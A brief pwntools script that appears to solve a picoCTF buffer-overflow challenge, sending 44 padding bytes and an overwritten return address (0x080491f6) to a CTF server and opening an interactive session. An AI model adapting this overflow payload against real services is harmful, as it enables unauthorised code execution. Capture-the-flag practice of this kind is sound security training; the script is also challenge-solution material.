from pwn import *

r = remote("saturn.picoctf.net",49570)
payload = b"A"*44 + p32(0x080491f6)
r.sendline(payload)
r.interactive()